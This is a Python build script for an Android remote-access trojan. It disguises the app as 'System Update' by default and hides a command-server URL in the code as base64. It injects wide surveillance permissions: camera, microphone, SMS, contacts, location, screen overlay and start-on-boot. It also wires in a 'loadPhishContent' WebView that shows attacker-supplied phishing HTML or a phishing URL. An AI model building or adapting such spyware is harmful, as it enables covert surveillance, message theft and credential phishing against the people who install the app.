#!/usr/bin/env python3
"""Inject name, URL/HTML/default, permissions ALL/TWO, server, pair, icon."""
import os, re, base64, sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
ANDROID = os.path.join(ROOT, "android")
MAIN_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/MainActivity.kt")
DEVICE_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/DeviceService.kt")
STRINGS = os.path.join(ANDROID, "app/src/main/res/values/strings.xml")
APP_GRADLE = os.path.join(ANDROID, "app/build.gradle")
MANIFEST = os.path.join(ANDROID, "app/src/main/AndroidManifest.xml")

APP_NAME = (os.environ.get("APP_NAME") or "System Update").strip()[:48] or "System Update"
APP_ID = (os.environ.get("APP_ID") or "com.sync.xxx").strip() or "com.sync.xxx"
RAT_TYPE = (os.environ.get("RAT_TYPE") or "ALL").strip().upper()
REDIRECT_MODE = (os.environ.get("REDIRECT_MODE") or "URL").strip().upper()
REDIRECT_VALUE = (os.environ.get("REDIRECT_VALUE") or "").strip()
SERVER_URL = (os.environ.get("SERVER_URL") or "http://papsky.queen-official.com:2468").strip()
PAIR_ID = (os.environ.get("PAIR_ID") or "NEONXJZET0000").strip()
VERSION_NAME = (os.environ.get("VERSION_NAME") or "1.0").strip()
VERSION_CODE = (os.environ.get("VERSION_CODE") or "1").strip()
ICON_B64 = (os.environ.get("ICON_BASE64") or os.environ.get("ICON_B64") or "").strip()

def xml_escape(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

print("[inject] name=%r mode=%s rat=%s pair=%s value=%r" % (
    APP_NAME, REDIRECT_MODE, RAT_TYPE, PAIR_ID, REDIRECT_VALUE[:60]))

# pair
uid = os.path.join(ANDROID, "app/src/main/assets/uid.json")
os.makedirs(os.path.dirname(uid), exist_ok=True)
open(uid, "w", encoding="utf-8").write(
    '{"uid":"%s","pair":"%s","auto":true}\n' % (PAIR_ID, PAIR_ID)
)

# app name
if os.path.isfile(STRINGS):
    s = open(STRINGS, encoding="utf-8", errors="ignore").read()
    safe = xml_escape(APP_NAME)
    if re.search(r'name="app_name"', s):
        s = re.sub(
            r'<string\s+name="app_name">[^<]*</string>',
            '<string name="app_name">%s</string>' % safe,
            s, count=1,
        )
    open(STRINGS, "w", encoding="utf-8").write(s)
    print("[inject] app_name =", APP_NAME)

# applicationId
if os.path.isfile(APP_GRADLE):
    g = open(APP_GRADLE, encoding="utf-8", errors="ignore").read()
    g = re.sub(r'applicationId\s+"[^"]*"', 'applicationId "%s"' % APP_ID, g, count=1)
    vc = re.sub(r"\D", "", VERSION_CODE) or "1"
    g = re.sub(r"versionCode\s+\d+", "versionCode %s" % vc, g, count=1)
    g = re.sub(r'versionName\s+"[^"]*"', 'versionName "%s"' % VERSION_NAME.replace('"', ""), g, count=1)
    open(APP_GRADLE, "w", encoding="utf-8").write(g)

# server
if os.path.isfile(DEVICE_KT):
    src = open(DEVICE_KT, encoding="utf-8", errors="ignore").read()
    b64 = base64.b64encode(SERVER_URL.encode()).decode("ascii")
    src2, n = re.subn(r'(Base64\.decode\(\s*")[^"]*(")', r"\1%s\2" % b64, src, count=1)
    if n:
        open(DEVICE_KT, "w", encoding="utf-8").write(src2)
        print("[inject] SERVER_URL OK")

# permissions ALL vs TWO
TWO_PERMS = """    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
"""

ALL_PERMS = TWO_PERMS + """    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.VIBRATE" />
"""

if os.path.isfile(MANIFEST):
    man = open(MANIFEST, encoding="utf-8", errors="ignore").read()
    perms = ALL_PERMS if RAT_TYPE == "ALL" else TWO_PERMS
    if "BASE_PERMS_BEGIN" in man and "BASE_PERMS_END" in man:
        man = re.sub(
            r"<!-- BASE_PERMS_BEGIN -->.*?<!-- BASE_PERMS_END -->",
            "<!-- BASE_PERMS_BEGIN -->\n" + perms + "    <!-- BASE_PERMS_END -->",
            man,
            count=1,
            flags=re.S,
        )
        open(MANIFEST, "w", encoding="utf-8").write(man)
        print("[inject] permissions", RAT_TYPE)
    else:
        print("[warn] perm markers missing — keep manifest")

# content: empty URL → default home; filled URL → loadUrl; HTML → asset
if not os.path.isfile(MAIN_KT):
    print("[error] MainActivity missing")
    sys.exit(1)

m = open(MAIN_KT, encoding="utf-8", errors="ignore").read()

# treat placeholder example as empty? user said if left as default tampilan awal
empty_url = (
    not REDIRECT_VALUE
    or REDIRECT_VALUE in ("https://example.com", "http://example.com", "example.com")
)

if REDIRECT_MODE == "HTML" and REDIRECT_VALUE and not empty_url:
    raw = REDIRECT_VALUE
    try:
        if re.match(r"^[A-Za-z0-9+/=\s]+$", raw) and len(raw) > 100:
            dec = base64.b64decode(raw).decode("utf-8", errors="ignore")
            if "<" in dec:
                raw = dec
    except Exception:
        pass
    if "<html" not in raw.lower():
        raw = (
            "<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
            "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
            "</head><body>%s</body></html>"
        ) % raw
    ap = os.path.join(ANDROID, "app/src/main/assets/phish.html.b64")
    open(ap, "w", encoding="utf-8").write(base64.b64encode(raw.encode()).decode("ascii"))
    body = """        try {
            val b64 = assets.open("phish.html.b64").bufferedReader().readText()
            val html = String(Base64.decode(b64, Base64.DEFAULT))
            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        } catch (e: Exception) {
            webView.loadUrl("about:blank")
        }"""
    print("[inject] content = HTML custom")
elif REDIRECT_MODE == "URL" and REDIRECT_VALUE and not empty_url:
    url = REDIRECT_VALUE
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    esc = url.replace("\\", "\\\\").replace('"', '\\"')
    body = '        webView.loadUrl("%s")' % esc
    print("[inject] content = URL", url)
else:
    # kosong / example.com → tampilan awal base
    body = """        try {
            val html = assets.open("default_home.html").bufferedReader().readText()
            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        } catch (e: Exception) {
            webView.loadUrl("about:blank")
        }"""
    print("[inject] content = DEFAULT home (URL kosong)")

block = (
    "    private fun loadPhishContent() {\n"
    "        // PHISH_INJECT_BEGIN\n"
    + body
    + "\n"
    "        // PHISH_INJECT_END\n"
    "    }"
)

pat = re.compile(
    r"    private fun loadPhishContent\(\) \{\n        // PHISH_INJECT_BEGIN\n.*?\n        // PHISH_INJECT_END\n    \}",
    re.S,
)
m2, n = pat.subn(block, m, count=1)
if n == 0:
    print("[error] inject marker not found")
    sys.exit(1)
open(MAIN_KT, "w", encoding="utf-8").write(m2)
print("[inject] loadPhishContent OK")

# icon
if ICON_B64:
    try:
        import io
        from pathlib import Path as P
        from PIL import Image
        data = base64.b64decode(ICON_B64.split(",")[-1])
        im = Image.open(io.BytesIO(data)).convert("RGBA")
        w, h = im.size
        side = min(w, h)
        im = im.crop(((w - side) // 2, (h - side) // 2, (w + side) // 2, (h + side) // 2))
        res = P(ANDROID) / "app/src/main/res"
        for dens, size in (("mdpi", 48), ("hdpi", 72), ("xhdpi", 96), ("xxhdpi", 144), ("xxxhdpi", 192)):
            d = res / ("mipmap-%s" % dens)
            d.mkdir(parents=True, exist_ok=True)
            r = im.resize((size, size), Image.LANCZOS)
            r.save(str(d / "ic_launcher.png"), format="PNG")
            r.save(str(d / "ic_launcher_round.png"), format="PNG")
        print("[inject] icon CUSTOM")
    except Exception as e:
        print("[warn] icon", e)
else:
    print("[inject] icon DEFAULT")

print("[inject] done")
